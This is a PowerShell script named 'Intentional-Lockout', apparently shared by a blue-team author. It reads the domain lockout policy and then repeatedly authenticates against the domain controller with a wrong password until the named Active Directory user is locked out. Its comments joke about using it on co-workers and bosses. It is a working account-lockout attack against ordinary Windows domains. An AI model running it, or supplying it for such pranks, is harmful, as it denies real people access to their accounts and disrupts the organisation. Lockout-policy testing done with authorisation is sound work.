<#
.NOTES

Author:      Adam "Abe" Abernethy
Twitter:     @ReallyBigAbe
Go here:     https://blueteam.ninja

Don't be a mean person. 

.SYNOPSIS

Intentionally lock out a user. 

.DESCRIPTION

This tool will attempt to scan your GPOs for the current lockout policy, then 
loop through an authenticated call to the current DC.  Depending on Active Directory version
this can be either a call to the Logon Server or a generic DNS call to the domain name. 

.PARAMETER Account
A string that will be passed as the default parameter to Get-Aduser

.INPUTS

None. You cannot pipe objects to Add-Extension.

.OUTPUTS

A verbose message based on results

.EXAMPLE

C:\PS> Intentional-Lockout -Account MrDuck
MrDuck has been locked out

.EXAMPLE

C:\PS> Intentional-Lockout -Account Fake00001
Fake00001 not found / valid

.NOTES
  I jacked the basics from http://mikefrobbins.com/2013/11/28/lock-out-active-directory-user-accounts-with-powershell/
  I'm not a DEV, so I have no idea what the protocol is here

  Only use it on friends, suspicious co-workers, and your boss's boss.  Anything else isn't funny enough.
#>

[CmdletBinding()]
Param(
    [Parameter(Mandatory=$true)]
        [string]$Account
)

try {
    $user = Get-ADUser $Account -Properties SamAccountName, UserPrincipalName, LockedOut
}
catch {
    Write-Output "$user not found / valid"
    return 0;
}
#Set a garbage password
$Password = ConvertTo-SecureString 'Not Really My Password' -AsPlainText -Force

#Scrape the Lockout requirements
if ((([xml](Get-GPOReport -Name "Default Domain Policy" -ReportType Xml)).GPO.Computer.ExtensionData.Extension.Account |
Where-Object name -eq LockoutBadCount).SettingNumber) {


if(Test-Connection $env:LOGONSERVER) {$dc = $env:LOGONSERVER}
elseif(Test-Connection $env:USERDOMAIN) {$dc = $env:USERDOMAIN}
else {$dc = $null; Write-Output "No DCs to mess with"   return 1;}

$user |
Do {

    Invoke-Command -ComputerName $dc {Get-Process
    } -Credential (New-Object System.Management.Automation.PSCredential ($($_.UserPrincipalName), $Password)) -ErrorAction SilentlyContinue

}
Until ((Get-ADUser -Identity $_.SamAccountName -Properties LockedOut).LockedOut)

Write-Output "$($_.SamAccountName) has been locked out"
}else{
    Write-Output "There's no lockout policy under `"Default Domain Policy`".  You might want to look into that, chief."
}

